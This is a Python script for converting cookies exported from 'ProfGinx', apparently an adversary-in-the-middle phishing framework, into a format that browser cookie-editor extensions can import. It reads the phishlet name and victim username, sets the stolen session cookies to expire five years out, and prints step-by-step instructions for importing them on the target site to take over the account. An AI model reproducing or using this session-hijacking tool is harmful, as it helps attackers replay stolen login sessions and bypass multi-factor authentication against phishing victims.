#!/usr/bin/env python3
"""
Cookie Format Converter for ProfGinx
Converts raw ProfGinx cookie exports to browser extension compatible format
"""

import json
import sys
import time
from datetime import datetime, timedelta
import argparse

def convert_cookies_to_browser_format(input_file, output_file=None):
    """Convert ProfGinx cookie format to browser extension format"""
    
    try:
        with open(input_file, 'r') as f:
            data = json.load(f)
    except Exception as e:
        print(f"Error reading input file: {e}")
        return False
    
    # Extract cookie tokens from ProfGinx format
    cookie_tokens = data.get('cookie_tokens', {})
    
    if not cookie_tokens:
        print("No cookie tokens found in the input file")
        return False
    
    # Convert to browser extension format
    browser_cookies = []
    
    for domain, cookies in cookie_tokens.items():
        for cookie_name, cookie_data in cookies.items():
            # Clean domain (remove leading dot if present)
            clean_domain = domain.lstrip('.')
            
            browser_cookie = {
                "name": cookie_data.get("Name", cookie_name),
                "value": cookie_data.get("Value", ""),
                "domain": clean_domain,
                "path": cookie_data.get("Path", "/"),
                "httpOnly": cookie_data.get("HttpOnly", False),
                "secure": True,  # Assume secure for HTTPS
                "sameSite": "None",
                "expirationDate": int((datetime.now() + timedelta(days=1825)).timestamp())  # 5 years from now
            }
            browser_cookies.append(browser_cookie)
    
    # Generate output filename if not provided
    if not output_file:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        username = data.get('username', 'unknown').replace('@', '_at_').replace('/', '_')
        phishlet = data.get('phishlet', 'unknown')
        output_file = f"cookies_browser_{phishlet}_{username}_{timestamp}.json"
    
    # Write browser-compatible format
    try:
        with open(output_file, 'w') as f:
            json.dump(browser_cookies, f, indent=2, ensure_ascii=False)
        
        print(f"Successfully converted {len(browser_cookies)} cookies")
        print(f"Output file: {output_file}")
        print("\nTo use these cookies:")
        print("1. Install a cookie editor browser extension")
        print("2. Go to the target website")
        print("3. Import the generated JSON file")
        print("4. Refresh the page")
        
        return True
        
    except Exception as e:
        print(f"Error writing output file: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description='Convert ProfGinx cookies to browser format')
    parser.add_argument('input_file', help='Input JSON file from ProfGinx')
    parser.add_argument('-o', '--output', help='Output filename (optional)')
    
    args = parser.parse_args()
    
    if not convert_cookies_to_browser_format(args.input_file, args.output):
        sys.exit(1)

if __name__ == "__main__":
    main()